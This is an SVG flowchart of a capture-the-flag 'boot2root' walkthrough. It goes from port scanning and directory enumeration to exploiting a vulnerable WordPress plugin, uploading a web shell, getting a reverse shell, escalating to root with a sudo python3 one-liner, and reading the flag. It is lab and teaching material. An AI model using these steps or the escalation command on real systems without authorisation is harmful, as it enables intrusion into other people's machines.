<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 480" font-family="Arial, sans-serif">
  <rect x="10" y="10" width="580" height="460" rx="5" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2"/>
  <text x="300" y="40" text-anchor="middle" font-size="18" font-weight="bold" fill="#333">Boot2Root Full Walkthrough</text>
  <defs>
    <marker id="arr" markerWidth="10" markerHeight="7" refX="3.5" refY="10" orient="auto">
      <polygon points="0 0, 3.5 10, 7 0" fill="#4a90e2"/>
    </marker>
  </defs>
  <!-- Step 1: SCAN -->
  <rect x="130" y="55" width="340" height="50" rx="5" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
  <text x="155" y="75" font-size="13" font-weight="bold" fill="#28a745">1. SCAN</text>
  <text x="155" y="93" font-size="11" fill="#333">nmap -sV -sC -p- target -&gt; Found port 80, 22</text>
  <line x1="300" y1="105" x2="300" y2="120" stroke="#4a90e2" stroke-width="2"/>
  <polygon points="295,115 305,115 300,125" fill="#4a90e2"/>
  <!-- Step 2: ENUMERATE -->
  <rect x="100" y="125" width="400" height="50" rx="5" fill="#fff3cd" stroke="#ffc107" stroke-width="2"/>
  <text x="125" y="145" font-size="13" font-weight="bold" fill="#856404">2. ENUMERATE</text>
  <text x="125" y="163" font-size="11" fill="#333">gobuster -&gt; /admin, /uploads | whatweb -&gt; WordPress 5.4</text>
  <line x1="300" y1="175" x2="300" y2="190" stroke="#4a90e2" stroke-width="2"/>
  <polygon points="295,185 305,185 300,195" fill="#4a90e2"/>
  <!-- Step 3: EXPLOIT -->
  <rect x="100" y="195" width="400" height="65" rx="5" fill="#f8d7da" stroke="#dc3545" stroke-width="2"/>
  <text x="125" y="215" font-size="13" font-weight="bold" fill="#dc3545">3. EXPLOIT</text>
  <text x="125" y="233" font-size="11" fill="#333">wpscan -&gt; Found vulnerable plugin</text>
  <text x="125" y="248" font-size="11" fill="#333">Exploit -&gt; Upload web shell -&gt; Reverse shell as www-data</text>
  <line x1="300" y1="260" x2="300" y2="275" stroke="#4a90e2" stroke-width="2"/>
  <polygon points="295,270 305,270 300,280" fill="#4a90e2"/>
  <!-- Step 4: ESCALATE -->
  <rect x="100" y="280" width="400" height="65" rx="5" fill="#f8d7da" stroke="#dc3545" stroke-width="2"/>
  <text x="125" y="300" font-size="13" font-weight="bold" fill="#dc3545">4. ESCALATE</text>
  <text x="125" y="318" font-size="11" fill="#333">sudo -l -&gt; Can run /usr/bin/python3 as root</text>
  <text x="125" y="333" font-size="11" fill="#333">sudo python3 -c 'import os; os.system("/bin/bash")' -&gt; ROOT!</text>
  <line x1="300" y1="345" x2="300" y2="360" stroke="#4a90e2" stroke-width="2"/>
  <polygon points="295,355 305,355 300,365" fill="#4a90e2"/>
  <!-- Step 5: CAPTURE -->
  <rect x="130" y="365" width="340" height="40" rx="5" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
  <text x="155" y="385" font-size="13" font-weight="bold" fill="#28a745">5. CAPTURE</text>
  <text x="250" y="385" font-size="11" fill="#333">cat /root/flag.txt -&gt; FLAG{...}</text>
  <line x1="300" y1="405" x2="300" y2="420" stroke="#4a90e2" stroke-width="2"/>
  <polygon points="295,415 305,415 300,425" fill="#4a90e2"/>
  <!-- Step 6: DOCUMENT -->
  <rect x="130" y="425" width="340" height="35" rx="5" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2"/>
  <text x="155" y="448" font-size="13" font-weight="bold" fill="#4a90e2">6. DOCUMENT</text>
  <text x="270" y="448" font-size="11" fill="#333">Write report with all steps and evidence</text>
</svg>
